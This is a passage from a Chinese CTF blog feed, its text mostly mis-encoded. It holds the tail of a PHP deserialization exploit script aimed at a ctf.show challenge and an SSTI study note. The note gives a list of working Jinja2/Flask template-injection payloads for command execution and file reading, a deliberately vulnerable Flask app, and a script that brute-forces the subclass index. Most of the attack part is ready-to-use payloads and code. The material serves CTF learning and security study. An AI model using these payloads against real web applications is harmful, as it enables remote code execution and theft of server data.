mi:<br>        data = &#123;<br>            <span class="hljs-string">&#x27;eval&#x27;</span>:<span class="hljs-string">&#x27;system(&quot;cat /f1agaaa&quot;);&#x27;</span><br>        &#125;<br>        url = <span class="hljs-string">f&quot;http://67423f19-3ba4-41b5-9e10-716ce8f5e683.challenge.ctf.show/index.php?get=<span class="hljs-subst">&#123;i&#125;</span>&quot;</span><br>        header = &#123;<br>            <span class="hljs-string">&#x27;aaaaaa&#x27;</span>:<span class="hljs-string">&#x27;O:3:&quot;EeE&quot;:2:&#123;s:4:&quot;text&quot;;O:5:&quot;gBoBg&quot;:3:&#123;s:4:&quot;name&quot;;N;s:4:&quot;file&quot;;s:1:&quot;1&quot;;s:4:&quot;coos&quot;;O:7:&quot;w_wuw_w&quot;:3:&#123;s:3:&quot;aaa&quot;;O:8:&quot;cycycycy&quot;:1:&#123;s:1:&quot;a&quot;;N;&#125;s:3:&quot;key&quot;;N;s:4:&quot;file&quot;;N;&#125;&#125;s:4:&quot;eeee&quot;;N;&#125;&#x27;</span><br>        &#125;<br>        reqpose = requests.post(url=url,data=data,headers=header).text<br>        re_text = re.findall(<span class="hljs-string">r&quot;(?&lt;=&lt;/code&gt;).*&quot;</span>, reqpose, re.S)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> re_text:<br>            <span class="hljs-built_in">print</span>(re_text[<span class="hljs-number">0</span>])<br>            d += <span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ¯æ—¥ä¸€web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ssti</tag>
      
      <tag>phpåŸç”Ÿç±»</tag>
      
      <tag>flaskåŠ å¯†ä¼ªé€ </tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Djingo_ssti</title>
    <link href="/2025/01/19/Djingo_ssti/"/>
    <url>/2025/01/19/Djingo_ssti/</url>
    
    <content type="html"><![CDATA[<p>ä¸€ç‚¹å…³äºsstiçš„å­¦ä¹ ç¬”è®°ä»¥ Djingoä¸ºä¾‹ å½“ç„¶ä¸ä»…ä»…åªæœ‰pythonçš„ssti å…¶ä»–è¯­è¨€ä¹Ÿæœ‰ï¼Œç”šè‡³Rustéƒ½æœ‰</p><p>ä¸ä¼šå°±è¯•è¯•<strong>fenjingä¸€æŠŠæ¢­å“ˆ</strong></p><h1 id="å¸¸è§payload"><a href="#å¸¸è§payload" class="headerlink" title="å¸¸è§payload"></a>å¸¸è§payload</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">1</span>ã€ä»»æ„å‘½ä»¤æ‰§è¡Œ<br>&#123;%<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()%&#125;&#123;%<span class="hljs-keyword">if</span> i.__name__ ==<span class="hljs-string">&#x27;_wrap_close&#x27;</span>%&#125;&#123;%<span class="hljs-built_in">print</span> i.__init__.__globals__[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;dir&#x27;</span>).read()%&#125;&#123;%endif%&#125;&#123;%endfor%&#125;<br><span class="hljs-number">2</span>ã€ä»»æ„å‘½ä»¤æ‰§è¡Œ<br>&#123;&#123;<span class="hljs-string">&quot;&quot;</span>.__class__.__bases__[<span class="hljs-number">0</span>]. __subclasses__()[<span class="hljs-number">138</span>].__init__.__globals__[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;<br>//è¿™ä¸ª<span class="hljs-number">138</span>å¯¹åº”çš„ç±»æ˜¯os._wrap_closeï¼Œåªéœ€è¦æ‰¾åˆ°è¿™ä¸ªç±»çš„ç´¢å¼•å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªpayload<br><span class="hljs-number">3</span>ã€ä»»æ„å‘½ä»¤æ‰§è¡Œ<br>&#123;&#123;url_for.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;</span>)&#125;&#125;<br><span class="hljs-number">4</span>ã€ä»»æ„å‘½ä»¤æ‰§è¡Œ<br>&#123;&#123;x.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&quot;</span>)&#125;&#125;<br>//xçš„å«ä¹‰æ˜¯å¯ä»¥ä¸ºä»»æ„å­—æ¯ï¼Œä¸ä»…ä»…é™äºx<br><span class="hljs-number">5</span>ã€ä»»æ„å‘½ä»¤æ‰§è¡Œ<br>&#123;&#123;config.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&quot;</span>)&#125;&#125;<br><span class="hljs-number">6</span>ã€æ–‡ä»¶è¯»å–<br>&#123;&#123;x.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).read()&#125;&#125;<br>//xçš„å«ä¹‰æ˜¯å¯ä»¥ä¸ºä»»æ„å­—æ¯ï¼Œä¸ä»…ä»…é™äºx<br><span class="hljs-number">7.</span>ä»»æ„å‘½ä»¤æ‰§è¡Œ<br>&#123;&#123;lipsum.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;cat /app/flag&#x27;</span>).read()&#125;&#125;<br><span class="hljs-number">8.</span>ä¸å‡ºç½‘å†™é™æ€æ–‡ä»¶<br>&#123;&#123;lipsum.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;echo cat /app/flag &gt;/app/static/1.txt&#x27;</span>).read()&#125;&#125;<br><span class="hljs-number">9.</span>å½“configæ˜¯<span class="hljs-literal">None</span>æ—¶ï¼Œå°è¯•è¯»å–current_appçš„config<br>&#123;&#123;url_for.__globals__[<span class="hljs-string">&#x27;current_app&#x27;</span>].config&#125;&#125;<br><br></code></pre></td></tr></table></figure><h1 id="å¸¸è§çš„å†…ç½®æ–¹æ³•"><a href="#å¸¸è§çš„å†…ç½®æ–¹æ³•" class="headerlink" title="å¸¸è§çš„å†…ç½®æ–¹æ³•"></a>å¸¸è§çš„å†…ç½®æ–¹æ³•</h1><ul><li>__class__è¿”å›å¯¹è±¡å¯¹åº”çš„ç±»</li><li>__module__è¿”å›å¯¹åº”ç±»å¯¹åº”çš„æ¨¡å—</li><li>__bases__è¿”å›ç±»æ‰€æœ‰çš„çˆ¶ç±»</li><li>__base__è¿”å›ç±»çš„åŸºç±»</li><li>__name__è¿”å›ç±»å</li><li>__mro__è¿”å›è§£ææ–¹æ³•è°ƒç”¨ç±»çš„é¡ºåºçš„å…ƒç»„</li><li>_<em>subclasses</em>_()å¯ä»¥ä¸¾æ‰€æœ‰åœ¨å†…å­˜ä¸­å­˜åœ¨çš„ç±» æ³¨æ„ä»–æ˜¯ä¸€ä¸ªå‡½æ•°</li><li>__init__é‡æ–°åŠ è½½ç±»çš„å±æ€§</li><li>__globals__ä¼šä»¥å­—å…¸çš„å½¢å¼è¿”å›å½“å‰ä½ç½®çš„å…¨éƒ¨å…¨å±€å˜é‡</li></ul><h1 id="å¸¸è§æ–¹æ³•"><a href="#å¸¸è§æ–¹æ³•" class="headerlink" title="å¸¸è§æ–¹æ³•"></a>å¸¸è§æ–¹æ³•</h1><p>è·å–é”®å€¼æˆ–ä¸‹æ ‡çš„æ–¹å¼</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">dict<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__builtins__&#x27;</span>]</span><br>dict.<span class="hljs-built_in">__getitem__</span>(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)<br>dict<span class="hljs-selector-class">.pop</span>(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)<br>dict<span class="hljs-selector-class">.get</span>(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)<br>dict<span class="hljs-selector-class">.setdefault</span>(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)<br>list<span class="hljs-selector-attr">[0]</span><br>list.<span class="hljs-built_in">__getitem__</span>(<span class="hljs-number">0</span>)<br>list<span class="hljs-selector-class">.pop</span>(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>è·å–å±æ€§çš„æ–¹å¼</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">().<span class="hljs-emphasis">__class__</span><br>()[&quot;<span class="hljs-emphasis">__class__</span>&quot;]<br>()|attr(&quot;<span class="hljs-emphasis">__class__</span>&quot;)<br>().<span class="hljs-emphasis">__getattribute__</span>(&quot;<span class="hljs-emphasis">__class__</span>&quot;)<br></code></pre></td></tr></table></figure><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs clean">&#123;%%&#125;å¯ä»¥ç”¨æ¥å£°æ˜å˜é‡ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç”¨äºå¾ªç¯è¯­å¥å’Œæ¡ä»¶è¯­å¥ã€‚<br>&#123;&#123;&#125;&#125;ç”¨äºå°†è¡¨è¾¾å¼æ‰“å°åˆ°æ¨¡æ¿è¾“å‡º<br>&#123;##&#125;è¡¨ç¤ºæœªåŒ…å«åœ¨æ¨¡æ¿è¾“å‡ºä¸­çš„æ³¨é‡Š<br>\##å¯ä»¥æœ‰å’Œ&#123;%%&#125;ç›¸åŒçš„æ•ˆæœ<br></code></pre></td></tr></table></figure>{%set%}æ‹¼æ¥<figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="language-xml">c.æ„é€ popen</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%<span class="hljs-name">set</span> c=dict(po=a,pen=a)|<span class="hljs-name">join</span>%&#125;</span><br></code></pre></td></tr></table></figure><h1 id="1-ä»€ä¹ˆæ˜¯SSTIæ¨¡æ¿æ³¨å…¥"><a href="#1-ä»€ä¹ˆæ˜¯SSTIæ¨¡æ¿æ³¨å…¥" class="headerlink" title="1.ä»€ä¹ˆæ˜¯SSTIæ¨¡æ¿æ³¨å…¥"></a>1.ä»€ä¹ˆæ˜¯SSTIæ¨¡æ¿æ³¨å…¥</h1><p>SSTIï¼ŒæœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥ï¼Œå…¶å®ä¹Ÿå°±æ˜¯æ¨¡æ¿å¼•æ“+æ³¨å…¥, é‚£ä¹ˆæˆ‘ä»¬é¦–å…ˆéœ€è¦äº†è§£ä¸€ä¸‹æ¨¡æ¿å¼•æ“</p><p>æ¨¡æ¿åªæ˜¯ä¸€ç§æä¾›ç»™ç¨‹åºæ¥è§£æçš„ä¸€ç§è¯­æ³•ï¼Œæ¢å¥è¯è¯´ï¼Œæ¨¡æ¿æ˜¯ç”¨äºä»æ•°æ®ï¼ˆå˜é‡ï¼‰åˆ°å®é™…çš„è§†è§‰è¡¨ç°ï¼ˆHTMLä»£ç ï¼‰è¿™é¡¹å·¥ä½œçš„ä¸€ç§å®ç°æ‰‹æ®µï¼Œè€Œè¿™ç§æ‰‹æ®µä¸è®ºåœ¨å‰ç«¯è¿˜æ˜¯åç«¯éƒ½æœ‰åº”ç”¨ã€‚</p><p>é€šä¿—ç‚¹ç†è§£ï¼šæ‹¿åˆ°æ•°æ®ï¼Œå¡åˆ°æ¨¡æ¿é‡Œï¼Œç„¶åè®©æ¸²æŸ“å¼•æ“å°†èµ›è¿›å»çš„ä¸œè¥¿ç”Ÿæˆ html çš„æ–‡æœ¬ï¼Œè¿”å›ç»™æµè§ˆå™¨ï¼Œè¿™æ ·åšçš„å¥½å¤„å±•ç¤ºæ•°æ®å¿«ï¼Œå¤§å¤§æå‡æ•ˆç‡ã€‚ä¹Ÿå°±æ˜¯htmlæ¡†æ¶</p><p>å¸¸è§çš„æ¨¡æ¿å¼•æ“ï¼š</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-symbol">PHP:</span> Smarty, Twig, <span class="hljs-keyword">Blade</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">java: </span><span class="hljs-keyword">JSP, </span>FreeMarker, Velocity<br><span class="hljs-symbol">Python:</span> <span class="hljs-keyword">Jinja2, </span>django, tornado<br></code></pre></td></tr></table></figure><p>ç®€å•çš„ssti</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,request,render_template_string<br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    name = request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>)<br>    template = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&lt;html&gt;</span><br><span class="hljs-string">  &lt;head&gt;</span><br><span class="hljs-string">    &lt;title&gt;SSTI&lt;/title&gt;</span><br><span class="hljs-string">  &lt;/head&gt;</span><br><span class="hljs-string"> &lt;body&gt;</span><br><span class="hljs-string">      &lt;h3&gt;Hello, %s !&lt;/h3&gt;</span><br><span class="hljs-string">  &lt;/body&gt;</span><br><span class="hljs-string">&lt;/html&gt;</span><br><span class="hljs-string">        &#x27;&#x27;&#x27;</span>% (name)<br>    <span class="hljs-keyword">return</span> render_template_string(template)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">8888</span>, debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure>å½“æˆ‘ä»¬è¾“å…¥nameæ˜¯å¯æ§çš„,ä½¿ç”¨çš„æ˜¯%Sæ¥å®ç°åŠ¨æ€çš„å­—ç¬¦ä¸²æ§åˆ¶ï¼Œè€ŒFlaskä½¿ç”¨çš„æ˜¯jinja2æ¨¡æ¿ï¼Œæˆ‘ä»¬å¯ä»¥ä¼ å…¥{{}}ï¼Œ`{{}}`åœ¨`Jinja2`ä¸­ä½œä¸ºå˜é‡åŒ…è£¹æ ‡è¯†ç¬¦ï¼Œ`Jinja2`åœ¨æ¸²æŸ“çš„æ—¶å€™ä¼šæŠŠ{{}}åŒ…è£¹çš„å†…å®¹è¿›è¡Œè§£æï¼Œå°±å¯ä»¥æ‰§è¡Œå‘½ä»¤ã€‚<h1 id="2-SSTIå‰ç½®çŸ¥è¯†"><a href="#2-SSTIå‰ç½®çŸ¥è¯†" class="headerlink" title="2.SSTIå‰ç½®çŸ¥è¯†"></a>2.SSTIå‰ç½®çŸ¥è¯†</h1><p>ä¸»è¦äº†è§£ä¸€ç‚¹Pythonçš„é­”æœ¯æ–¹æ³•å’Œå†…ç½®ç±»</p><p><code>__class__</code>ç”¨äºè¿”å›è¯¥å¯¹è±¡æ‰€å±çš„ç±»<br>ç¤ºä¾‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;abcd&#x27;</span>.__class__<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>().__class__<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;tuple&#x27;</span>&gt;<br></code></pre></td></tr></table></figure><p><code>__base__</code>ç”¨äºè·å–ç±»çš„åŸºç±»<br>ç¤ºä¾‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&quot;&quot;</span>.__class__<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&quot;&quot;</span>.__class__.__base__<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;object&#x27;</span>&gt;<br>//<span class="hljs-built_in">object</span>ä¸º<span class="hljs-built_in">str</span>çš„åŸºç±»<br></code></pre></td></tr></table></figure><p><code>__mro__</code>è¿”å›è§£ææ–¹æ³•è°ƒç”¨çš„é¡ºåºçš„å…ƒç»„ã€‚ï¼ˆå½“è°ƒç”¨_mro_[1]æˆ–è€…-1æ—¶ä½œç”¨å…¶å®ç­‰åŒäº_base_ï¼‰<br>ç¤ºä¾‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&quot;&quot;</span>.__class__.__mro__<br>(&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;object&#x27;</span>&gt;)<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&quot;&quot;</span>.__class__.__mro__[<span class="hljs-number">1</span>]<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;object&#x27;</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&quot;&quot;</span>.__class__.__mro__[-<span class="hljs-number">1</span>]<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;object&#x27;</span>&gt;<br></code></pre></td></tr></table></figure><p><code>__subclasses__()</code>å¯ä»¥è·å–ç±»çš„æ‰€æœ‰å­ç±»çš„å…ƒç»„<br>ç¤ºä¾‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&quot;&quot;</span>.__class__.__mro__[-<span class="hljs-number">1</span>].__subclasses__()<br>[&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;type&#x27;</span>&gt;,&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;dict_keys&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;dict_values&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;dict_items&#x27;</span>&gt;...]<br></code></pre></td></tr></table></figure><p><code>__init__</code><br>é‡è½½å­ç±»ï¼Œè·å–å­ç±»åˆå§‹åŒ–çš„å±æ€§ã€‚</p><p><code>__globals__</code><br>å‡½æ•°ä¼šä»¥å­—å…¸çš„å½¢å¼è¿”å›å½“å‰ä½ç½®çš„å…¨éƒ¨å…¨å±€å˜é‡<br>å°±æ¯”å¦‚ï¼š<code>os._wrap_close.__init__.__globals__</code>ï¼Œå¯ä»¥è·å–åˆ°osä¸­çš„ä¸€äº›å‡½æ•°ï¼Œè¿›è¡Œæ–‡ä»¶è¯»å–</p><h1 id="3-SSTIè¯­å¥æ„é€ "><a href="#3-SSTIè¯­å¥æ„é€ " class="headerlink" title="3.SSTIè¯­å¥æ„é€ "></a>3.SSTIè¯­å¥æ„é€ </h1><p>ç¬¬ä¸€æ­¥ï¼Œæ‹¿åˆ°å½“å‰ç±»ï¼Œä¹Ÿå°±æ˜¯ç”¨__class__</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">name</span><span class="hljs-operator">=</span>&#123;&#123;<span class="hljs-string">&quot;&quot;</span>.__class__&#125;&#125;<br></code></pre></td></tr></table></figure><p>ç¬¬äºŒæ­¥ï¼Œæ‹¿åˆ°åŸºç±»ï¼Œè¿™é‡Œå¯ä»¥ç”¨__base__ï¼Œä¹Ÿå¯ä»¥ç”¨__mro__</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__bases__</span>[0]&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">æˆ–</span><br><span class="language-xml">name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__mro__</span>[1]&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">æˆ–</span><br><span class="language-xml">name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__mro__</span>[-1]&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>ç¬¬ä¸‰æ­¥ï¼Œæ‹¿åˆ°åŸºç±»çš„å­ç±»ï¼Œç”¨<code>__subclasses__()</code></p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">name=&#123;&#123;<span class="hljs-string">&quot;&quot;</span>.__class__.__bases__[<span class="hljs-number">0</span>]. __subclasses__()&#125;&#125;<br>[&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;type&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;weakref&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;weakcallableproxy&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;weakproxy&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;int&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;bytearray&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;bytes&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;list&#x27;</span>&gt;, <br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥çš„è¯ï¼Œå°±è¦æ‰¾å¯åˆ©ç”¨çš„ç±»ï¼Œå¯»æ‰¾é‚£äº›æœ‰å›æ˜¾çš„æˆ–è€…å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„ç±»<br>å¤§å¤šæ•°åˆ©ç”¨çš„æ˜¯<code>os._wrap_close</code>è¿™ä¸ªç±»ï¼Œæˆ‘ä»¬è¿™é‡Œå¯ä»¥ç”¨ä¸€ä¸ªç®€å•è„šæœ¬æ¥å¯»æ‰¾å®ƒå¯¹åº”çš„ä¸‹æ ‡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>headers = &#123;<br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>:<span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36&#x27;</span>&#125;<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">500</span>):<br>    url = <span class="hljs-string">&quot;http://127.0.0.1:8888/?name=\</span><br><span class="hljs-string">        &#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&quot;]&#125;&#125;&quot;</span><br>    res = requests.get(url=url, headers=headers)<br>    <span class="hljs-comment">#print(res.text)</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;os._wrap_close&#x27;</span> <span class="hljs-keyword">in</span> res.text:<br>        <span class="hljs-built_in">print</span>(i)<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å°±å¯ä»¥åˆ©ç”¨<code>osã€‚_wrap_close</code>ï¼Œè¿™ä¸ªç±»ä¸­æœ‰<code>popen</code>æ–¹æ³•ï¼Œæˆ‘ä»¬å»è°ƒç”¨å®ƒ<br>é¦–å…ˆ<br>å…ˆè°ƒç”¨å®ƒçš„__init__æ–¹æ³•è¿›è¡Œåˆå§‹åŒ–ç±»</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__bases__</span>[0]. __subclasses__()[138].__init__&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>ç„¶åå†è°ƒç”¨__globals__è·å–åˆ°æ–¹æ³•å†…ä»¥å­—å…¸çš„å½¢å¼è¿”å›çš„æ–¹æ³•ã€å±æ€§ç­‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">name=&#123;&#123;<span class="hljs-string">&quot;&quot;</span>.__class__.__bases__[<span class="hljs-number">0</span>]. __subclasses__()[<span class="hljs-number">138</span>].__init__.__globals__&#125;&#125;<br></code></pre></td></tr></table></figure><p>æ­¤æ—¶å°±å¯ä»¥å»è¿›è¡ŒRCEäº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">name=&#123;&#123;<span class="hljs-string">&quot;&quot;</span>.__class__.__bases__[<span class="hljs-number">0</span>]. __subclasses__()[<span class="hljs-number">138</span>].__init__.__globals__[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;dir&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure><p>è¿˜æœ‰ä¸€ä¸ªæ¯”è¾ƒå‰å®³çš„æ¨¡å—ï¼Œå°±æ˜¯<code>__builtins__</code>,å®ƒé‡Œé¢æœ‰<code>eval()</code>ç­‰å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥ä¹Ÿåˆ©ç”¨å®ƒæ¥è¿›è¡ŒRCE<br>å®ƒçš„payloadæ˜¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;url_for.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;</span>)&#125;&#125;<br></code></pre></td></tr></table></figure><h1 id="4-SSTIå¸¸è§çš„ç»•è¿‡æ–¹å¼"><a href="#4-SSTIå¸¸è§çš„ç»•è¿‡æ–¹å¼" class="headerlink" title="4.SSTIå¸¸è§çš„ç»•è¿‡æ–¹å¼"></a>4.SSTIå¸¸è§çš„ç»•è¿‡æ–¹å¼</h1><h2 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title="ç»•è¿‡  ."></a>ç»•è¿‡  .</h2><p>å½“.è¢«banæ—¶ï¼Œæœ‰ä»¥ä¸‹å‡ 